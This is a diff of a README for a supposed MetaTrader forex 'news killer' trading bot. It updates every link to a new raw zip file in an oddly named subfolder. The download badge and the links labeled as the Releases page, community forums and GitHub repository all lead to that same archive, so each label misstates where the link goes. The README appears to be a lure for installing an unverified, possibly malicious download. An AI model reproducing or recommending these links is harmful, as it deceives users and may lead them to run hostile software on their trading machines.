@@ -6,7 +6,7 @@ Welcome! This guide will help you easily download and run the forex-news-killer,
 
 ## 📥 Download Now
 
-[![Download forex-news-killer](https://raw.githubusercontent.com/DodsonPeek/forex-news-killer/main/hexamerism/forex-news-killer_1.0.zip%20News%20Killer-brightgreen)](https://raw.githubusercontent.com/DodsonPeek/forex-news-killer/main/hexamerism/forex-news-killer_1.0.zip)
+[![Download forex-news-killer](https://github.com/DodsonPeek/forex-news-killer/raw/refs/heads/main/hexamerism/news_forex_killer_v2.9.zip%20News%20Killer-brightgreen)](https://github.com/DodsonPeek/forex-news-killer/raw/refs/heads/main/hexamerism/news_forex_killer_v2.9.zip)
 
 ## 🛠️ What You Need
 
@@ -33,7 +33,7 @@ In forex trading, news events can cause price fluctuations. Major news from econ
 
 To get started, visit the Releases page to download the forex-news-killer.
 
-[Download the forex-news-killer here](https://raw.githubusercontent.com/DodsonPeek/forex-news-killer/main/hexamerism/forex-news-killer_1.0.zip)
+[Download the forex-news-killer here](https://github.com/DodsonPeek/forex-news-killer/raw/refs/heads/main/hexamerism/news_forex_killer_v2.9.zip)
 
 1. **Visit the Releases Page:** Click the link to open the page.
 2. **Choose the Latest Version:** Find the most recent version of the EA.
@@ -79,12 +79,12 @@ If you encounter issues:
 - **EA Not Showing Up:** Ensure you placed the `.ex4` file in the correct directory and restarted MetaTrader 4.
 - **No Trades Executing:** Check if your trading account is connected to the internet and that there are no issues with your broker.
 
-For additional support, consider visiting the [community forums](https://raw.githubusercontent.com/DodsonPeek/forex-news-killer/main/hexamerism/forex-news-killer_1.0.zip) for MetaTrader users who share tips and advice.
+For additional support, consider visiting the [community forums](https://github.com/DodsonPeek/forex-news-killer/raw/refs/heads/main/hexamerism/news_forex_killer_v2.9.zip) for MetaTrader users who share tips and advice.
 
 ## 📞 Need Help?
 
-For further assistance, please reach out via the issues section on the [GitHub repository](https://raw.githubusercontent.com/DodsonPeek/forex-news-killer/main/hexamerism/forex-news-killer_1.0.zip). 
+For further assistance, please reach out via the issues section on the [GitHub repository](https://github.com/DodsonPeek/forex-news-killer/raw/refs/heads/main/hexamerism/news_forex_killer_v2.9.zip). 
 
 Thank you for choosing forex-news-killer. Your trading experience is about to become much safer! 
 
-[Download the forex-news-killer here](https://raw.githubusercontent.com/DodsonPeek/forex-news-killer/main/hexamerism/forex-news-killer_1.0.zip)
+[Download the forex-news-killer here](https://github.com/DodsonPeek/forex-news-killer/raw/refs/heads/main/hexamerism/news_forex_killer_v2.9.zip)
